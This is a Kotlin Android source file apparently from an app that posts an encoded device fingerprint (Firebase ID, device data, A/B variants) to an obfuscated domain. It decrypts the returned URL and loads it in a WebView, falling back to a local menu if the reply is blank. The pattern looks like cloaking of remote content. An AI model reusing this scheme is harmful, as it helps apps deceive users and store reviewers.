package com.kmp.hook.elite

import android.content.Intent
import android.util.Log
import android.webkit.WebSettings
import androidx.activity.ComponentActivity
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.lifecycle.lifecycleScope
import com.google.firebase.Firebase
import com.google.firebase.analytics.analytics
import com.kmp.hook.elite.PushAlarmScheduler.isPushFeatureEnabled
import com.kmp.hook.elite.util.AESEncryption.decrypt
import com.kmp.hook.elite.util.PayloadEncoder.encodePayload
import com.kmp.hook.elite.localdata.SaveManager
import com.kmp.hook.elite.localdata.SaveManager.getData
import com.kmp.hook.elite.localdata.SingleMap
import com.kmp.hook.elite.localdata.checkToSend
import com.kmp.hook.elite.localdata.dom
import com.kmp.hook.elite.localdata.softText
import com.kmp.hook.elite.localnav.whenInit
import com.kmp.hook.elite.localnav.LocalNavObj.point
import com.kmp.hook.elite.localnav.ScreenManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import java.io.IOException
import java.util.concurrent.TimeUnit
import kotlin.onFailure

class StartCache(activity: ComponentActivity, intent: Intent) {
    var newView: ViewCustom = ViewCustom(
        activity,
        ClientCustom(activity)
    )

    init {
        whenInit(intent)
    }

    fun newV(): ViewCustom {
        return newView
    }

    fun ifConnected(activity: ComponentActivity, startCache: StartCache, onEnd: () -> Unit) {
        activity.lifecycleScope.launch(Dispatchers.IO) {
            runCatching {
                val url = getData(activity)

                if (url.isBlank()) {
                    postM(activity, startCache, onEnd)
                } else {
                    onEnd()
                    withContext(Dispatchers.Main) {
                        startCache.newV().getW().apply {
                            requestFocus()
                            loadUrl(url)
                        }
                    }
                }
            }
        }
    }

    suspend fun postM(activity: ComponentActivity, startCache: StartCache, onEnd: () -> Unit) {
        Log.d("KKKKK", "postM")
        val client = OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build()

        val map2 = buildMap {
            set(SingleMap.map["gk"]!! , runAfter(activity))
            set(SingleMap.map["rk"]!! , softText(activity))
            set(SingleMap.map["ei"]!! , getFirebaseId())
            set(SingleMap.map["paramOne"]!!, getTime(activity))
            set(SingleMap.map["clock"]!! , checkToSend(activity))
            set(SingleMap.map["p10"]!! , getDev())
            set(SingleMap.map["weeks"]!! , "push_after_leave|push_dialog|storage_camera")
            set(SingleMap.map["p4"]!! , PushDialogAb.getABVariant(activity))
            set(SingleMap.map["p5"]!! , isPushFeatureEnabled(activity))
            set(SingleMap.map["p7"]!! , FileChooserABC.getABVariant(activity))
        }

        val encoded = encodePayload(map2)

        val body = encoded.toRequestBody("text/plain".toMediaType())

        Log.d("KKKKK", "encoded: ${encoded}")
        Log.d("KKKKK", "body: ${body}")
        try {
            val request = Request.Builder()
                .url("https://$dom/${SingleMap.map["auth"]}")
                .post(body)
                .addHeader("User-Agent", WebSettings.getDefaultUserAgent(activity))
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    e.printStackTrace()
                    point(ScreenManager.InternetProblem)
                    Log.d("KKKKK", "response: $e")
                }

                override fun onResponse(call: Call, response: Response) {
                    Log.d("KKKKK", "response: $response")
                    response.use {
                        val payload = it.body.string()
                        Log.d("KKKKK", "payload: $payload")
                        if (payload.isBlank()) {
                            point(ScreenManager.MenuPoint)
                        } else {
                            runCatching {
                                val decrypted = decrypt(payload, SingleMap.map["p5"]!!)

                                Log.d("KKKKK", "decrypted: ${decrypted}")
                                CoroutineScope(Dispatchers.IO).launch {
                                    try {
                                        SaveManager.safeSave(activity, decrypted)
                                    } catch (_: Exception) {
                                    }
                                }

                                CoroutineScope(Dispatchers.Main).launch {
                                    runCatching {
                                        onEnd()
                                        startCache.newView.loadUrl(decrypted)
                                    }.onFailure {
                                        point(ScreenManager.MenuPoint)
                                    }
                                }
                            }.onFailure {
                                point(ScreenManager.InternetProblem)
                            }
                        }
                    }
                }
            })
        } catch (e: Exception) {
            Log.d("KKKKK", "try: $e")
        }
    }

    private suspend fun getFirebaseId(): String =
        runCatching {
            Firebase.analytics.appInstanceId.await()
        }.getOrNull().orEmpty()

}
